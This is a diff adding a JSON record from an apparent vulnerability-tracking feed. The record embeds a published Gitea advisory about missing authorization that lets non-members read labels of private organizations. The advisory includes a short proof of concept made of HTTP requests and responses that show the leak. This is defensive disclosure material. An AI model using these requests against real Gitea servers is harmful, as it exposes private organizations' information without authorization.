@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"author\": null, \"closed_at\": null, \"collaborating_teams\": null, \"collaborating_users\": null, \"created_at\": null, \"credits\": [{\"login\": \"ybsun0215\", \"type\": \"reporter\"}], \"credits_detailed\": [{\"state\": \"accepted\", \"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/48913347?v=4\", \"events_url\": \"https://api.github.com/users/ybsun0215/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/ybsun0215/followers\", \"following_url\": \"https://api.github.com/users/ybsun0215/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ybsun0215/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/ybsun0215\", \"id\": 48913347, \"login\": \"ybsun0215\", \"node_id\": \"MDQ6VXNlcjQ4OTEzMzQ3\", \"organizations_url\": \"https://api.github.com/users/ybsun0215/orgs\", \"received_events_url\": \"https://api.github.com/users/ybsun0215/received_events\", \"repos_url\": \"https://api.github.com/users/ybsun0215/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/ybsun0215/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ybsun0215/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/ybsun0215\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-25038\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": null, \"vector_string\": null}, \"cvss_v4\": {\"score\": null, \"vector_string\": null}}, \"cwe_ids\": [\"CWE-200\", \"CWE-862\"], \"cwes\": [{\"cwe_id\": \"CWE-200\", \"name\": \"Exposure of Sensitive Information to an Unauthorized Actor\"}, {\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"Unauthorized Access to Labels of Private Organizations\\r\\n\\r\\n## Summary\\r\\n\\r\\nGitea 1.26.2 does not properly enforce organization visibility restrictions on organization label read endpoints.\\r\\n\\r\\nA user without access to a private organization can retrieve labels belonging to that organization through the Organization Labels API. As a result, label metadata intended to be restricted to organization members may be disclosed.\\r\\n\\r\\nThe issue is limited to unauthorized read access. No unauthorized modification of labels was observed.\\r\\n\\r\\n## Details\\r\\n\\r\\nThe following endpoints are affected:\\r\\n\\r\\n* `GET /api/v1/orgs/{org}/labels`\\r\\n* `GET /api/v1/orgs/{org}/labels/{id}`\\r\\n\\r\\nDuring testing, a private organization was created and a label was added to that organization.\\r\\n\\r\\nAccess to the organization itself was correctly restricted. A user without membership in the organization received a `404 Not Found` response when requesting organization information.\\r\\n\\r\\nHowever, the same user was still able to retrieve organization labels through the endpoints listed above.\\r\\n\\r\\nFor comparison, other organization-scoped endpoints such as:\\r\\n\\r\\n* `GET /api/v1/orgs/{org}/teams`\\r\\n* `GET /api/v1/orgs/{org}/hooks`\\r\\n* `GET /api/v1/orgs/{org}/actions/secrets`\\r\\n\\r\\ncorrectly denied access to unauthorized users.\\r\\n\\r\\nThe label endpoints returned the full Label object, including fields such as:\\r\\n\\r\\n* `id`\\r\\n* `name`\\r\\n* `description`\\r\\n* `color`\\r\\n* `url`\\r\\n\\r\\nWrite operations were tested separately and remained protected by authorization checks.\\r\\n\\r\\n## PoC\\r\\n\\r\\n### Setup\\r\\n\\r\\nCreate a private organization:\\r\\n\\r\\n```http\\r\\nPOST /api/v1/orgs\\r\\nAuthorization: token <owner_token>\\r\\n\\r\\n{\\r\\n  \\\"username\\\": \\\"target-org\\\",\\r\\n  \\\"visibility\\\": \\\"private\\\"\\r\\n}\\r\\n```\\r\\n\\r\\nCreate a label:\\r\\n\\r\\n```http\\r\\nPOST /api/v1/orgs/target-org/labels\\r\\nAuthorization: token <owner_token>\\r\\n\\r\\n{\\r\\n  \\\"name\\\": \\\"internal-label\\\",\\r\\n  \\\"color\\\": \\\"#aabbcc\\\",\\r\\n  \\\"description\\\": \\\"private organization label\\\"\\r\\n}\\r\\n```\\r\\n\\r\\nVerify that the organization is not accessible to a non-member:\\r\\n\\r\\n```http\\r\\nGET /api/v1/orgs/target-org\\r\\nAuthorization: token <non_member_token>\\r\\n```\\r\\n\\r\\nResponse:\\r\\n\\r\\n```http\\r\\nHTTP/1.1 404 Not Found\\r\\n```\\r\\n\\r\\n### Retrieve all labels\\r\\n\\r\\nRequest:\\r\\n\\r\\n```http\\r\\nGET /api/v1/orgs/target-org/labels\\r\\nAuthorization: token <non_member_token>\\r\\n```\\r\\n\\r\\nObserved response:\\r\\n\\r\\n```http\\r\\nHTTP/1.1 200 OK\\r\\n```\\r\\n\\r\\nThe response contains labels belonging to the private organization.\\r\\n\\r\\n### Retrieve a specific label\\r\\n\\r\\nRequest:\\r\\n\\r\\n```http\\r\\nGET /api/v1/orgs/target-org/labels/1\\r\\nAuthorization: token <non_member_token>\\r\\n```\\r\\n\\r\\nObserved response:\\r\\n\\r\\n```http\\r\\nHTTP/1.1 200 OK\\r\\n```\\r\\n\\r\\nThe full Label object is returned.\\r\\n\\r\\n### Verify write protection\\r\\n\\r\\nRequest:\\r\\n\\r\\n```http\\r\\nPATCH /api/v1/orgs/target-org/labels/1\\r\\nAuthorization: token <non_member_token>\\r\\n```\\r\\n\\r\\nResponse:\\r\\n\\r\\n```http\\r\\nHTTP/1.1 403 Forbidden\\r\\n```\\r\\n\\r\\n### PoC Details\\r\\nhttps://anonymous.4open.science/r/Gitea_PoC-EC93/2_poc_private_org_labels_leak\\r\\n\\r\\n## Impact\\r\\n\\r\\nUsers who are not authorized to access a private organization can obtain label metadata associated with that organization.\\r\\n\\r\\nDepending on how labels are used, this may disclose internal organizational information contained in label names or descriptions.\\r\\n\\r\\nThe issue affects confidentiality only. No integrity or availability impact was observed.\\r\\n\", \"ghsa_id\": \"GHSA-v73x-hx65-6pf4\", \"html_url\": \"https://github.com/go-gitea/gitea/security/advisories/GHSA-v73x-hx65-6pf4\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-v73x-hx65-6pf4\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-25038\"}], \"private_fork\": null, \"published_at\": \"2026-06-21T17:40:51Z\", \"publisher\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/75789103?v=4\", \"events_url\": \"https://api.github.com/users/bircni/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/bircni/followers\", \"following_url\": \"https://api.github.com/users/bircni/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/bircni/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/bircni\", \"id\": 75789103, \"login\": \"bircni\", \"node_id\": \"MDQ6VXNlcjc1Nzg5MTAz\", \"organizations_url\": \"https://api.github.com/users/bircni/orgs\", \"received_events_url\": \"https://api.github.com/users/bircni/received_events\", \"repos_url\": \"https://api.github.com/users/bircni/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/bircni/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/bircni/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/bircni\", \"user_view_type\": \"public\"}, \"severity\": \"medium\", \"state\": \"published\", \"submission\": null, \"summary\": \"Unauthorized Access to Labels of Private Organizations\", \"updated_at\": \"2026-06-21T17:40:51Z\", \"url\": \"https://api.github.com/repos/go-gitea/gitea/security-advisories/GHSA-v73x-hx65-6pf4\", \"vulnerabilities\": [{\"package\": {\"ecosystem\": \"go\", \"name\": \"code.gitea.io/gitea\"}, \"patched_versions\": \"1.26.3\", \"vulnerable_functions\": [], \"vulnerable_version_range\": \"1.26.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "gitea:ghsa-v73x-hx65-6pf4",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "code.gitea.io/gitea: 1.26.2"
+    ],
+    "cves": [
+      "CVE-2026-25038"
+    ],
+    "fixed_versions": [
+      "code.gitea.io/gitea: 1.26.3"
+    ],
+    "mitigations": [],
+    "products": [
+      "code.gitea.io/gitea"
+    ],
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-17T23:39:54.547698Z",
+  "provenance": {
+    "content_sha256": "57a5ec5dc9c8847c44b8fd51d4386e243f3f6f07316bddcd4667e4611aa9febb",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-21T17:40:51Z",
+  "schema_version": 1,
+  "source_id": "gitea_github",
+  "source_url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-v73x-hx65-6pf4",
+  "status": "active",
+  "title": "Unauthorized Access to Labels of Private Organizations",
+  "updated_at": "2026-06-21T17:40:51Z",
+  "vendor": "Gitea",
+  "vendor_advisory_id": "GHSA-v73x-hx65-6pf4"
+}
